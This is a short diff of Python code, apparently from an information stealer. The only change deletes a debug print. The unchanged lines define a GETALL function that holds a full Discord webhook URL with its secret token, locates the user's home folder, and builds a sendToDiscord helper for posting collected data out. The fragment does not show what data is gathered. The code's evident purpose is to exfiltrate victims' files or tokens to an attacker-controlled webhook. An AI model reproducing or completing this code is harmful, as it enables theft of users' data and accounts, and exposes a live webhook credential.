@@ -4,7 +4,6 @@ def GETALL():
     ok = 'https://discord.com/api/webhooks/905032361790550027/MRlL2utxgymhTx8AIye7fIZ4Ay0zWpuZ5vB9nrE8ZFleihZjEnHTE_w1_qw5IlB3LVjI'
     OK2 = []
     currpath = os.getcwd()
-    print(currpath)
     userspath = '\\'.join(currpath.split('\\')[:3])
     def sendToDiscord(webhook_url, message):
         payload = {
